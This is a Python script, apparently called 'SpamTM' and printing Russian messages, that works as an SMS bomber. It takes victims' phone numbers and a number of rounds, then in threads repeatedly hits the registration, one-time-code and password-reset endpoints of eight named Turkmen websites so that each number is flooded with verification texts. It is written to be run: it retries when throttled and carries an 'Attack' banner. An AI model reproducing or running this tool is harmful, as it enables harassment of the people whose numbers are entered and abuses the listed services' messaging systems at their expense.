# !pip install requests
# !pip install colorama


from requests import post, get
from requests.exceptions import TooManyRedirects
from colorama import Back, Fore, init as colinit
from time import sleep
from threading import Thread



class Sites:
	
    def belet(self, phone):
        r = post("https://api.belet.me/api/v1/auth/sign-in",
		json = {"phone":phone,"fingerprint":"110aec2bfcca53e0793f5973e5b86926"})

        if r.status_code == 200:
            print(Fore.GREEN + "[Belet] Сообщение отправлено.")
        else:
            print(Fore.RED + f"[Belet] Ошибка: Код {r.status_code}")


    def gipertm(self, phone):
        r = post("https://gipertm.com/api/v1/profile/register",
        json = {"lang":"tk", "username":str(phone)})

        if r.status_code == 200:
            print(Fore.GREEN + "[GiperTm] Сообщение отправлено.")
        else:
            print(Fore.RED + f"[GiperTm] Ошибка: Код {r.status_code}")


    def asman_express(self, phone):
        r = post("https://shop-adm.asmanexpress.com/api/customers/auth/otp?type=register",
        json = {"phone":str(phone)})

        if r.status_code == 200:
            print(Fore.GREEN + "[Asman Express] Сообщение отправлено.")
        else:
            print(Fore.RED + f"[Asman Express] Ошибка: Код {r.status_code}")


    def nesipetsin(self, phone):
        r = post("https://nesipetsin.com:7070/nesipetsin/mobile/user/register",
        json = {"method":"phone","step":1,"phone":str(phone)[3:],"email":"null","code":"null","password":"null","confirmPassword":"null","errorMsg":"null"})

        if r.status_code == 200:
            print(Fore.GREEN + "[Nesip Etsin] Сообщение отправлено.")
        else:
            print(Fore.RED + f"[Nesip Etsin] Ошибка: Код {r.status_code}")


    def saraytm(self, phone):
        r = get("https://saray.tm/verify?phone=" + str(phone)[3:] + "&terms=accept")

        if r.status_code == 200:
            print(Fore.GREEN + "[SarayTm] Сообщение отправлено.")
        else:
            print(Fore.RED + f"[SarayTm] Ошибка: Код {r.status_code}")


    def awtoyoly(self, phone):
        r = post("http://awtoyoly.com.tm/Client/AwtoCheckLogin",
        data = {"phone":str(phone)[3:]})

        if r.status_code == 200:
            print(Fore.GREEN + "[Awtoyoly] Сообщение отправлено.")
        else:
            print(Fore.RED + f"[Awtoyoly] Ошибка: Код {r.status_code}")



    def ynamdar(self, phone):
        r = post("https://ynamdar.com/v3/forgot_password",
        data = {"registration-type": "phone", "phone": str(phone)[3:], "action": "send-confirmation-code"})

        if r.status_code == 200:
            print(Fore.GREEN + "[Ynamdar] Сообщение отправлено.")
        else:
            print(Fore.RED + f"[Ynamdar] Ошибка: Код {r.status_code}")


    def markayoly(self, phone):
        r = post("https://api.markayoly.com/api/start-signup",
        json = {"phone":str(phone)[3:]})

        if r.status_code == 200:
            print(Fore.GREEN + "[Markayoly] Сообщение отправлено.")
        else:
            print(Fore.RED + f"[Markayoly] Ошибка: Код {r.status_code}")
            

class Spammer(Sites):

	def __init__(self, phones, tries):
		colinit(autoreset=True)

		try:
			self.phones = [int(i) for i in phones.split(",")]
		except ValueError:
			print(Fore.RED + "[Ошибка] неправильно введён номер!")
			exit()

		self.tries = tries
		# print(self.phones)


	def start(self, phone):
		try:
			self.belet(phone)
			self.gipertm(phone)
			self.asman_express(phone)
			self.nesipetsin(phone)
			self.saraytm(phone)
			self.awtoyoly(phone)
			self.ynamdar(phone)
			self.markayoly(phone)
		except TooManyRedirects:
			print("Слишком много запросов, беру отдых...")
			sleep(10)
			self.tries += 1
			pass
		except Exception as unknownError:
			print("Необработанная ошибка:", unknownError)
			
		print("Круг завершился")


	def attack(self):
		print("""
			  _   _             _
\t\t     /\  | | | |           | |
\t\t    /  \ | |_| |_ __ _  ___| | __
\t\t   / /\ \| __| __/ _` |/ __| |/ /
\t\t  / ____ \ |_| || (_| | (__|   <
\t\t /_/    \_\__|\__\__,_|\___|_|\_\
\n\n
""")

		for _ in range(self.tries):
			for phone in self.phones:
				thread = Thread(target=self.start, args=(phone, ))
				thread.start()
				print(f"{_+1}.Круг пошёл...")

				if _ < self.tries - 1:
					sleep(10)



if __name__ == "__main__":
	print("""
\t\t  ___                 _ _ _____ __  __
\t\t / __|_ __  __ _ _ __| | |_   _|  \/  |
\t\t \__ \ '_ \/ _` | '  \_  _|| | | |\/| |
\t\t |___/ .__/\__,_|_|_|_||_| |_| |_|  |_|
\t\t     |_|
""")

	phone = input(Back.RED + "Введите номера через запятую: ")
	print(Back.RESET, end="")
	tries = int(input(Back.GREEN + "Введите кол-во кругов: "))
	print(Back.RESET)

	Spammer = Spammer(phone, tries)
	Spammer.attack()
	input()